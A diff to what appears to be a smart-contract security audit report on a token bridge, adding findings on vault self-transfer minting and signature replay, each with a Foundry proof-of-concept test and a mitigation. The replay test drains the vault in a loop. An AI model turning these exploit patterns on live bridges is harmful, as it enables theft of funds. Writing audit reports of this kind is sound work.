@@ -121,9 +121,81 @@ Follow the instructions given in (zksync era docs)[https://docs.zksync.io/build/
 
 To guarantee that create/create2 functions operate correctly, the compiler must be aware of the bytecode of the deployed contract in advance. The compiler interprets the calldata arguments as incomplete input for ContractDeployer, as the remaining part is filled in by the compiler internally. The Yul datasize and dataoffset instructions have been adjusted to return the constant size and bytecode hash rather than the bytecode itself.
 
+### [H-4] `L1BossBridge::depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens
+
+**Description:** The Vault contract, in its constructor, grants nearly infinite approval to the bridge contract, meaning the bridge has permission to transfer an nearly unlimited number of tokens from the Vault. 
+
+```solidity
+        vault.approveTo(address(this), type(uint256).max);
+```
+In the `depositTokensToL2` function, the caller can specify the `from` address from which the tokens are taken. This allows a malicious actor to instruct the bridge to withdraw tokens from the Vault itself, effectively transferring tokens from the Vault to the Vault. This would allow the attacker to trigger the Deposit event any number of times, presumably causing the minting of unbacked tokens in L2. Additionally, they could mint all the tokens to themselves.
+
+**Proof Of Concept:**
+
+As a PoC, include the following test in the L1TokenBridge.t.sol file:
+
+```solidity
+function testCanTransferFromVaultToVault() public {
+    vm.startPrank(attacker);
+    uint256 vaultBalance = 500 ether;
+    deal(address(token), address(vault), vaultBalance);
+
+    // Can trigger the `Deposit` event self-transferring tokens in the vault
+    vm.expectEmit(address(tokenBridge));
+    emit Deposit(address(vault), address(vault), vaultBalance);
+    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
+
+    // Unlimited number of times
+    vm.expectEmit(address(tokenBridge));
+    emit Deposit(address(vault), address(vault), vaultBalance);
+    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
+
+    vm.stopPrank();
+}
+```
 
 
-### [H-4] Minted Tokens locked forever
+**Recomended Mitigation:**
+As suggested in `[H-1]`, consider modifying the `depositTokensToL2` function so that the caller cannot specify a from address.
+
+### [H-5]  Lack of replay protection in `L1BossBridge::withdrawTokensToL1` allows withdrawals by signature to be replayed
+
+**Description:** Users who want to withdraw tokens from the bridge can call the sendToL1 function, or the wrapper withdrawTokensToL1 function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.However, the signatures do not include any kind of replay-protection mechanism (e.g., nonces).
+
+**Impact:** Since, there is no  replay-protection mechanism.Therefore, valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.
+
+**Proof Of Concept:**
+
+```solidity
+function testCanReplayWithdrawals() public {
+    // Assume the vault already holds some tokens
+    uint256 vaultInitialBalance = 1000e18;
+    uint256 attackerInitialBalance = 100e18;
+    deal(address(token), address(vault), vaultInitialBalance);
+    deal(address(token), address(attacker), attackerInitialBalance);
+
+    // An attacker deposits tokens to L2
+    vm.startPrank(attacker);
+    token.approve(address(tokenBridge), type(uint256).max);
+    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);
+
+    // Operator signs withdrawal.
+    (uint8 v, bytes32 r, bytes32 s) =
+        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);
+
+    // The attacker can reuse the signature and drain the vault.
+    while (token.balanceOf(address(vault)) > 0) {
+        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+    }
+    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+    assertEq(token.balanceOf(address(vault)), 0);
+}
+```
+
+**Recommended Mitigation:**
+Consider redesigning the withdrawal mechanism so that it includes replay protection.
+
+### [H-6] Minted Tokens locked forever
 
 **Description:** The `TokenFactory::deployToken` function calls `L1Token` contract for deploying purpose. The problem arises when the `L1Token` mints `INITIAL_SUPPLY` to `msg.sender` which is `TokenFactory` contract in this case. After deployment, there is no way to either transfer out these tokens or mint new ones, as the holder of the tokens, `TokenFactory`, has no functions for this, also not an upgradeable contract, so all token supply is locked forever.
 
